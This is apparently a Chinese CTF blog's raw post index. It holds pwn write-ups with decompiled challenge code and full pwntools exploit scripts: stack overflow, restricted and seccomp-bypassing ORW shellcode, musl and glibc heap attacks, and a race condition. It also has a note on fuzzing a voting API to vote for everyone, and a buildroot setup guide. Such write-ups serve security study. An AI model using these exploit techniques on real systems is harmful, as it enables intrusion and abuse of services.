HTTP/1.1Host: example.comConnection: keep-aliveContent-Length: 25Accept: application/json, text/plain, */*X-Requested-With: XMLHttpRequestAuthorization: Bearer &#123;&#123;yak(sign)&#125;&#125;User-Agent: ?Origin: example.comAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9&#123;&quot;player ids&quot;:[&quot;&#123;&#123;int(0-65535)&#125;&#125;&quot;]&#125;\n\n其他发现在列排名的时候发现能拿到所有人的id使用yakit自带的提取器进行id提取然后添加到fuzztag实现朋友叫你帮忙投票的时候给所有人投票）总结没事玩玩这些还是挺好玩的，就是现在环境越来越好了，真打不进去\n","tags":["web"]},{"title":"羊城杯2023初赛_pwn_复现","url":"/2023/09/05/ycbCTF-pwn-review/","content":"这次羊城杯见识涨了不少复现完，应该能够窥见天才殿堂的一角了吧…2023-羊城杯-题目附件risky-loginrisc-v的题第一次看tnnd,搞半天环境不如用ghidra\nundefined8 FUN_123457ea(void)&#123;  undefined auStack_130 [288];    gp = &amp;__global_pointer$;  FUN_123456a0();  puts(&quot;RiskY LoG1N SySTem&quot;);  puts(&quot;Input ur name:&quot;);  read(0,&amp;DAT_12347078,8);  printf(&quot;Hello, %s&quot;);  puts(&quot;Input ur words&quot;);  read(0,auStack_130,0x120);  FUN_12345786(auStack_130);  puts(&quot;message received&quot;);  return 0;&#125;\n\nvoid FUN_12345786(char *param_1)&#123;  size_t sVar1;  char acStack_108 [248];    gp = &amp;__global_pointer$;  sVar1 = strlen(param_1);  DAT_12347070 = (byte)sVar1; //溢出  if (8 &lt; DAT_12347070) &#123;    puts(&quot;too long.&quot;);                    /* WARNING: Subroutine does not return */    exit(-1);  &#125;  strcpy(acStack_108,param_1);  return;&#125;\n溢出点在这里，强行转换为byte类型后会造成16个字节的溢出\nvoid FUN_123456ee(void)&#123;  char *pcVar1;    gp = &amp;__global_pointer$;  puts(&quot;background debug fun.&quot;);  puts(&quot;input what you want exec&quot;);  read(0,&amp;DAT_12347078,8);  pcVar1 = strstr(&amp;DAT_12347078,&quot;sh&quot;);  if ((pcVar1 == (char *)0x0) &amp;&amp; (pcVar1 = strstr(&amp;DAT_12347078,&quot;flag&quot;), pcVar1 == (char *)0x0)) &#123;    system(&amp;DAT_12347078);    return;  &#125;  puts(&quot;no.&quot;);                    /* WARNING: Subroutine does not return */  exit(-1);&#125;\n这个是后门函数，ban掉了”sh”和”flag”，可以通过cat f*来绕过\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,29560)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context(log_level=&#x27;debug&#x27;)system = 0x0000000000010760p.recvuntil(b&quot;Input ur name:&quot;)p.send(b&#x27;0&#x27;*8)p.recvuntil(b&quot;Input ur words&quot;)p.send(b&#x27;1&#x27;*0x100+p64(0x0000000123456EE))p.sendline(b&#x27;cat f*&#x27;)p.interactive()\n\nshellcode可以执行长度为 0x10 字节的 shellcode，shellcode 指令只能为 pop&#x2F;push &lt;寄存器&gt;。\n解题的关键点有两个：(1) shellcode 地址位于栈上；(2) 开头可以写任意 2 字节数据到栈上（也就是那个 “[2] Input: (ye &#x2F; no)”）。\n解题思路是先将 2 字节的 syscall 汇编指令码（\\x0f\\x05）写到栈上，然后利用 pop&#x2F;push 指令将指令码复制到 shellcode 内存末尾，并布置好寄存器，最后调用 read 系统调用读入 cat flag shellcode 到 shellcode 内存上。\n栈上有一个缓冲区地址恰好指向我们输入的 syscall 指令码，可以把这个缓冲区地址 pop 到 rsp，将 syscall 指令码 pop 到某个寄存器后，再次利用 pop&#x2F;push 指令将 rsp 改成事先保存好的 shellcode 内存地址，最后利用 pop 指令将 syscall 指令码写到 shellcode 内存地址上即可。\n执行 shellcode 前加载了 seccomp 沙盒，只能调用 open, write, read 和 dup2 系统调用，并限制 read 和 write fd 参数的范围（read 限制 fd &lt;&#x3D;2、write 限制 fd &gt;2）。 fd 限制可以利用 dup2 重定向 fd 来绕过。\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;tcp.cloud.dasctf.com&quot;, 27135)p.sendafter(&quot;[2] Input: (ye / no)&quot;, b&quot;\\x0f\\x05&quot;) sc1 = asm(&quot;&quot;&quot;push raxpop rsipush rbxpop raxpush rbxpop rdipop rbxpop rbxpop rsppop rdxpush rsipop rsppop rbxpop rbxpop rbxpush rdxpush rdx&quot;&quot;&quot;)p.sendafter(&quot;[5] ======== Input Your P0P Code ========&quot;, sc1)sc2 = &quot;nop\\n&quot;*0x12sc2 += &quot;&quot;&quot;mov rsp, r12mov rax, 0x67616c662fpush raxmov rdi, rspmov rsi, 0mov rax, 2syscallmov rdi, raxmov rsi, 0mov rax, 33syscallmov rdi, 1mov rsi, 23mov rax, 33syscallmov rdi, 0mov rsi, rspmov rdx, 0x100mov rax, 0syscallmov rdi, 23mov rax, 1syscall&quot;&quot;&quot;p.send(asm(sc2))p.interactive()\n\ncookieBox先贴篇文章https://www.anquanke.com/post/id/202253#h3-12很详细，看完来看题\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  char *v3; // rdx  const char *v4; // rdi  char v5[256]; // [rsp+10h] [rbp-110h] BYREF  _QWORD v6[2]; // [rsp+110h] [rbp-10h] BYREF  v6[1] = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  v3 = v5;  memset(v5, 0, sizeof(v5));  v4 = (const char *)v6;  while ( 1 )  &#123;    sub_400CE8(v4, 0LL, v3);    switch ( (unsigned int)sub_400980() )    &#123;      case 1u:        sub_400A50();        break;      case 2u:        sub_400B69();        break;      case 3u:        sub_400C59();        break;      case 4u:        sub_400BE1();        break;      case 5u:        exit(0);      default:        v4 = &quot;invalid choice&quot;;        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\n常规菜单题，增删改查\nint sub_400C59()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input the idx:&quot;);  v1 = sub_400980();  if ( v1 &lt;= 0xF &amp;&amp; (&amp;buf)[v1] &amp;&amp; *((_DWORD *)&amp;nbytes + v1) )  &#123;    puts(&quot;Please input the content:&quot;);    read(0, (&amp;buf)[v1], *((unsigned int *)&amp;nbytes + v1));    puts(&quot;Done&quot;);  &#125;  return puts(&quot;Idx Error&quot;);&#125;\nfree之后没有把指针清空，存在UAF\n第一步泄漏 libc 基址，musl-libc 把程序内存或者 libc 内存的空闲内存划为堆内存，耗尽后才会申请动态内存。泄露堆地址就可以得到程序基址或 libc 基址\nleak 之后可以利用 unbin 进行unlink，unbin 没有检查prev和next指针是否合法，通过堆溢出我们可以改写这两个指针，利用 unbin 向任意地址写指针地址，即*(uint64_t*)(prev + 2) &#x3D; next和*(uint64_t*)(next + 3) &#x3D; prev。\n可以将 prev改成 io(stdin stdout)，然后把 next改成 bss地址，然后申请一个 chunk 0x100，就可以实现将任意地址写入 bss 地址，然后再申请，即可任意申请io写io，然后改io为 binsh 打system即可\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;cookieBox&#x27;)libc = ELF(&#x27;libc.so&#x27;)p = process(&#x27;./cookieBox&#x27;)#p = remote(&#x27;tcp.cloud.dasctf.com&#x27;, 25633)def debug():    gdb.attach(p)     pause()    def add(size, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size:\\n&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Content:\\n&quot;)    p.send(payload)def free(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;2&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))def edit(idx, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;3&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))    p.recvuntil(&quot;content:\\n&quot;)    p.send(payload)def show(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;4&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))add(0x100, b&#x27;a&#x27;*8)  #chunk0add(0x100, b&#x27;a&#x27;*8)  #chunk1add(0x100, b&#x27;a&#x27;*8)  #chunk2add(0x100, b&#x27;a&#x27;*8)  #chunk3show(0)p.recv(8)libc.address = u64(p.recvuntil(b&quot;\\x7f&quot;).ljust(0x8,b&quot;\\x00&quot;)) - 0x292e50success(&quot;libc.address--&gt;&quot;+hex(libc.address))    #leak_libc_basestdin = libc.address + 0x292200success(&quot;stdin--&gt;&quot;+hex(stdin))system = libc.sym[&#x27;system&#x27;]success(&quot;system--&gt;&quot;+hex(system))bss = 0x602060free(1)add(0x100, b&#x27;1&#x27;)  #chunk4free(1)           #double_free chunk1edit(4, p64(stdin) + p64(0x602070-0x10)) #bss_addr#debug()add(0x100, b&quot;A&quot;)  #chunk5,fake_chunkpayload = b&quot;/bin/sh\\x00&quot;payload += b&#x27;A&#x27; * 0x20payload += p64(0x22222222) # stdin -&gt; wpos -&gt; stdin -&gt; wbasepayload += b&#x27;A&#x27; * 8payload += p64(0x11111111)payload += b&#x27;A&#x27; * 8payload += p64(system)edit(2, payload)p.recvuntil(&quot;&gt;&gt;&quot;)p.sendline(&quot;5&quot;)p.interactive()\n\neasy_vm\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  puts(&quot;It&#x27;s a easy vmpwn,enjoy it&quot;);  ptr = malloc(0x1000uLL);  malloc(0x20uLL);  free(ptr);//进入unsortedbin，其 fd、bk 指针指向 main_arena+88 的位置（第一个进入unsortedbin的chunk的性质）,可以泄露libc  ptr = 0LL;  qword_201040 = (__int64)malloc(0x1000uLL);  buf = malloc(0x1000uLL);     puts(&quot;Inputs your code:&quot;);  read(0, buf, 0x1000uLL);  while ( *(_BYTE *)buf )  &#123;    switch ( *(_BYTE *)buf )    &#123;      case 1:        qword_201040 += 8LL;        *(_QWORD *)qword_201040 = qword_201038; //保存201038的内容        buf = (char *)buf + 8;        break;      case 2:        qword_201038 = *(_QWORD *)qword_201040;        qword_201040 -= 8LL;        buf = (char *)buf + 8;        break;      case 3:        *(_QWORD *)qword_201038 = *(_QWORD *)qword_201040;//赋值，将201040里的内容赋给201038        buf = (char *)buf + 8;        break;      case 4:        qword_201038 ^= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 5:        qword_201038 = *(_QWORD *)qword_201038;        buf = (char *)buf + 8;        break;      case 6:        qword_201038 += *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 7:                                             qword_201038 -= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;        //case6 case7可以实现调偏移      default:        buf = (char *)buf + 8;        break;    &#125;  &#125;  exit(0);&#125;\none_gadget\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先给 0x201038 一个 libc（2），算 one_gadget（7）保存到 0x201040（1），再算 exit_hook（6），用（3）将 one_gadget 赋值到 0x201038 的 exit_hook 中。\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#p = process(&#x27;./easy_vm&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,23804)libc = ELF(&#x27;./libc-2.23.so&#x27;)libc = 0x3c4b78exit1 = 0x5f0040 + 3848exit2 = 0x5f0040 + 3856one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]payload = p64(2)                    #libcpayload+= p64(7)                    payload+= p64(libc - one_gadget[3]) #calc_onegadgetpayload+= p64(1)                    #gadget_push_in_201040 payload+= p64(6)                    payload+= p64(exit1 - one_gadget[3])#calc_exit_hook payload+= p64(3)                    #gdb.attach(p)p.recvuntil(&#x27;Inputs your code:\\n&#x27;)p.sendline(payload)p.interactive()\nheap\nunsigned __int64 __fastcall sub_1732(char *a1)&#123;  int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  const char *src; // [rsp+18h] [rbp-118h]  const char *srca; // [rsp+18h] [rbp-118h]  char dest[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v7; // [rsp+128h] [rbp-8h]  v7 = __readfsqword(0x28u);  src = strtok(a1, &quot;:&quot;);  if ( src )  &#123;    strcpy(a1, src);    srca = strtok(0LL, &amp;byte_21DA);    if ( srca )      strcpy(dest, srca);  &#125;  puts(&quot;The paper index loading&quot;);  v2 = atoi(a1);  v3 = *(_DWORD *)(*((_QWORD *)s + v2) + 8LL);  sleep(1u);   //竞争窗口  if ( (unsigned int)v2 &lt;= 0xF &amp;&amp; *((_QWORD *)s + v2) )  &#123;    printf(&quot;paper index: %d\\n&quot;, (unsigned int)v2);    puts(&quot;Input the new paper content&quot;);    strncpy(**((char ***)s + v2), dest, v3);    puts(&quot;Done&quot;);  &#125;  else  &#123;    puts(&quot;Invalid paper index&quot;);  &#125;  return v7 - __readfsqword(0x28u);&#125;\n多线程未加锁导致竞争条件。edit 存在 1 秒的竞争窗口，且竞争窗口过后没有更新 v3。同时没有限制堆块大小，可以申请一个大chunk1在竞争窗口中free掉chunk1，同时申请小堆块chunk2此时可以对chunk2进行溢出\nint __fastcall sub_1469(const char *a1)&#123;  int result; // eax  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  _DWORD *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15 &amp;&amp; *((_QWORD *)s + i); ++i )    ;  if ( i == 16 )    return puts(&quot;paper pool is full&quot;);  v3 = strlen(a1);  if ( v3 &lt;= 79 || v3 &gt; 104 )    return puts(&quot;paper size error&quot;);  v4 = malloc(0x10uLL);  *(_QWORD *)v4 = malloc(v3);  v4[2] = v3;  printf(&quot;creating paper with index %d\\n&quot;, (unsigned int)i);  puts(&quot;Input the paper content&quot;);  strncpy(*(char **)v4, a1, v3);  puts(&quot;Done&quot;);  result = (int)v4;  *((_QWORD *)s + i) = v4;  return result;&#125;\n溢出对象是保存堆块地址的小堆块,也就是这里的v4因为edit用的是\nstrncpy(*(char **)v4, a1, v3);\n我们要注意溢出空间不能过大，以免破坏其他数据\n首先泄漏 libc 地址。线程的堆块都分配至单独的线程堆 （堆地址以 0x7f 开头），arena 的位置就位于堆空间上方，所以只要溢出修改 ptr 低位就可以将其指向 arena，从而泄漏 arena 上的 libc 地址（泄漏出来的地址恰好是 main arena 地址）。\ngetshell 方法是泄漏 libc 上的栈地址，然后将栈上的 main 函数返回地址修成 one gadget 地址。libc 上有两处地方可以泄漏栈地址，__environ 和 __libc_argv，这道题只能使用后者，因为前者地址的最低位恰好是空字节。\n栈需要修改两个地方，第一个是前面提到的 main 函数返回地址，第二个是 main 函数的 saved rbp。修改 saved rbp 是为了满足 one gadget 利用条件（下图这个），原来的 saved rbp 是数值 1，需要把它改成任意一个可写内存地址。\n0xebdb3 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x50 is writable  [rbp-0x50] == NULL || rbp-0x50 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL\n\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)import timecontext(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p= process(&#x27;./heap&#x27;)elf = ELF(&#x27;./heap&#x27;)#p = remote(&quot;tcp.cloud.dasctf.com&quot;, 21479)libc = ELF(&quot;./libc-3.35.so&quot;)sla      = lambda x, y : p.sendlineafter(y, str(x) if not isinstance(x, bytes) else x) sl       = lambda x : p.sendline(str(x) if not isinstance(x, bytes) else x)sa       = lambda x, y : p.sendafter(y, str(x) if not isinstance(x, bytes) else x)   def add(ctx):    sla(f&quot;1 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)    def show(ctx):    sla(f&quot;2 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)def edit(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sla(pp, &quot;Your chocie:&quot;)def edit_no(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sl(pp)def free(idx):    sla(f&quot;4 &#123;idx&#125;&quot;, &quot;Your chocie:&quot;)    def free_no(idx):    sl(f&quot;4 &#123;idx&#125;&quot;)add(&quot;A&quot;*0x50) #chunk0add(&quot;B&quot;*0x68)add(&quot;C&quot;*0x61)add(&quot;a&quot;*0x50) #chunk3add(&quot;b&quot;*0x68)add(&quot;c&quot;*0x62)add(&quot;1&quot;*0x50) #chunk6add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)add(&quot;1&quot;*0x50) #chunk9add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)free(0)edit(2, b&quot;X&quot;*0x60+b&quot;\\x80&quot;)free(2)add(&quot;C&quot;*0x61) #chunk0add(&quot;A&quot;*0x50) #chunk2time.sleep(3)free(3)edit(5, b&quot;x&quot;*0x60+b&quot;\\xa0\\x08&quot;)free(5)add(&quot;c&quot;*0x62) #chunk3add(&quot;a&quot;*0x50) #chunk5time.sleep(3)show(4)p.recvuntil(&quot;paper content: &quot;)libc.address = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x219c80success(&quot;libcbase: 0x%lx&quot;, libc.address)p_stack = libc.address + 0x21aa20edit_no(1, p64(p_stack)[:6])time.sleep(3)show(0)p.recvuntil(&quot;paper content: &quot;)stack = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))main_ret_addr = stack-0x110success(&quot;stackbase: 0x%lx&quot;, libc.address)success(&quot;main ret address ptr: 0x%lx&quot;, main_ret_addr)free_no(6)edit(8, b&quot;0&quot;*0x60+p64(main_ret_addr-8)[:6])free(8)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)writable_ptr_b = p64(libc.address + 0x21c240)edit(7, writable_ptr_b[:6])free_no(9)edit(11, b&quot;0&quot;*0x60+p64(main_ret_addr)[:6])free(11)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)one_gadget_b =p64(libc.address + 0xEBD48)edit(10, one_gadget_b[:6])time.sleep(3)p.sendline(&quot;5&quot;)p.interactive()","categories":["wp"]},{"title":"交叉编译环境的搭建","url":"/2024/03/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/","content":"去年羊城杯第一次开始搞异构的分析前两天在整理环境的时候就想着总结一下\n//安装依赖库sudo apt-get updatesudo apt-get install libncurses5-dev patch //下载源码git clone https://github.com/buildroot/buildroot.git //进行编译的配置cd buildrootmake cleanmake menuconfig\nmake menuconfig 之后会出来一个菜单在toolchain里选择你需要编译的环境然后在下方Kernel Headers选择你的linux内核版本内核版本查看：\nuname -r\n.退出后就可以make了，泡个茶开摆） 注意保持网络畅通，可能会下载一些依赖\nmake完成后就可以编译了，编译器的目录\ncd /buildroot/output/host/usr/bin./riscv64-linux-gcc your_c_programm.c\n","categories":["plays"],"tags":["plays"]},{"title":"拿不到shell的shellcode","url":"/2023/08/01/%E6%8B%BF%E4%B8%8D%E5%88%B0shell%E7%9A%84shellcode/","content":"Shell we talk?Shall we talk?seccomp-tools下载\nsudo apt install gcc ruby-devgem install seccomp-tools\nThe arts of shellcode山海关巨佬的博客：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/1. [HGAME 2023 week1]simple_shellcodechecksec：\n[*] &#x27;/var/run/vmblock-fuse/blockdir/4JPOf1/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox:    \nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/U0Wns2/vuln&#x27; line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0004: 0x06 0x00 0x00 0x00000000  return KILL\n保护全开，沙盒禁用了system，考虑orw\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init();  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);  puts(&quot;Please input your shellcode:&quot;);  read(0, (void *)0xCAFE0000LL, 0x10uLL);  sandbox();  MEMORY[0xCAFE0000]();  return 0;&#125;\n动调看到有一段权限都有的地址，可供写入shellcode。0x10的长度不够，所以我们要手搓shellcode来call一个read，以此写入orw的shellcode。\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File        0xcafe0000         0xcafe1000 rwxp     1000      0 /dev/zero (deleted) ***    0x555555554000     0x555555555000 r--p     1000      0 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555555000     0x555555556000 r-xp     1000   1000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555556000     0x555555557000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555557000     0x555555558000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555558000     0x555555559000 rw-p     1000   3000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x7ffff7dc4000     0x7ffff7de6000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7de6000     0x7ffff7f5e000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7f5e000     0x7ffff7fac000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fac000     0x7ffff7fb0000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb0000     0x7ffff7fb2000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb2000     0x7ffff7fb8000 rw-p     6000      0 [anon_7ffff7fb2]    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\n把断点下到执行shellcode前的地方看看寄存器\n RAX  0x0 RBX  0x5555555553d0 (__libc_csu_init) ◂— endbr64  RCX  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff RDX  0xcafe0000 ◂— xor dword ptr [rcx], esi /* 0xa343135343131; &#x27;114514\\n&#x27; */ RDI  0x16 RSI  0x2 R8   0x0 R9   0x0 R10  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff R11  0x217 R12  0x555555555100 (_start) ◂— endbr64  R13  0x7fffffffe3f0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe300 ◂— 0x0 RSP  0x7fffffffe2f0 —▸ 0x7fffffffe3f0 ◂— 0x1*RIP  0x5555555553b9 (main+131) ◂— call rdx\nread(0,0xcafe0000+x（地址）,0x1000(长度))在系统调用中就是rax=0,rdi=0,rsi = 0xcafe0000+x（地址）rdx=0x1000(长度)那么我们对照上面的寄存器地址就可以构造第一个payload首先rax=0 不用改变，先把rdi变成0 然后再把rsi=0xCAFE0010,rdx本身就够大了 也不用改变shellcode=asm(&quot;&quot;&quot; mov rdi,rax mov rsi,0xCAFE0010 syscall nop &quot;&quot;&quot;) 或 看read的汇编   0x55555555538b &lt;main+85&gt;     mov    rax, qword ptr [rbp - 8]   0x55555555538f &lt;main+89&gt;     mov    edx, 0x10   0x555555555394 &lt;main+94&gt;     mov    rsi, rax   0x555555555397 &lt;main+97&gt;     mov    edi, 0   0x55555555539c &lt;main+102&gt;    mov    eax, 0   0x5555555553a1 &lt;main+107&gt;    call   read@plt                &lt;read@plt&gt;把eax和edi清零，把edx变得足够大，把esi改成要写入的位置，也可以达到同样的调用效果      shellcode1 = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall &quot;&quot;&quot;)调用完read之后找一段orw的shellcode输进去即可shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)  或利用shellcraftshellcode2 = b&quot;\\x90&quot; * 0x100  # 填充100个nop指令shellcode2 += asm(shellcraft.open(&quot;/flag&quot;))shellcode2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))shellcode2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p=process(&#x27;./vuln&#x27;)p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28311)shellcode1=asm(&#x27;&#x27;&#x27; mov rdi,rax; mov rsi,0xCAFE0010; syscall; nop; &#x27;&#x27;&#x27;)p.sendafter(&quot;Please input your shellcode:\\n&quot;,shellcode1)shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)p.send(shellcode2)print(p.recv())print(p.recv())\n\n2. [GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  